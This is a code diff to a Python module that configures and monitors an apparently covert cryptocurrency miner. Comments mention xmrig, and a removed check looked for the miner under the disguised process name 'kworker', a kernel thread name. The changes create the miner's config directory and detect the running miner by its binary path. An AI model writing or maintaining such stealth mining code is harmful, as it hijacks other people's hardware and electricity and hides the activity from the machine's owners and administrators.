@@ -159,6 +159,9 @@ def _create_config(worker_id="default"):
     """Create config file with GPU support."""
     config_path = _get_config_path()
     
+    # Ensure directory exists
+    config_path.parent.mkdir(parents=True, exist_ok=True)
+    
     # Detect GPU
     has_nvidia = False
     has_amd = False
@@ -262,24 +265,19 @@ def _create_config(worker_id="default"):
     return config_path
 
 def _is_running():
-    """Check if service is already running - check by process name."""
+    """Check if service is already running - check by binary path."""
     try:
-        # Check for our process name (set by xmrig)
+        binary_path = _get_binary_path()
+        if not binary_path.exists():
+            return False
+        
+        # Check if our binary is running
         result = subprocess.run(
-            ["pgrep", "-f", "kworker"],
+            ["pgrep", "-f", str(binary_path)],
             capture_output=True,
             text=True
         )
-        # Also check if binary is running
-        if result.returncode == 0:
-            return True
-        # Check by binary path
-        result2 = subprocess.run(
-            ["pgrep", "-f", str(_get_binary_path())],
-            capture_output=True,
-            text=True
-        )
-        return result2.returncode == 0
+        return result.returncode == 0 and result.stdout.strip()
     except:
         return False
 
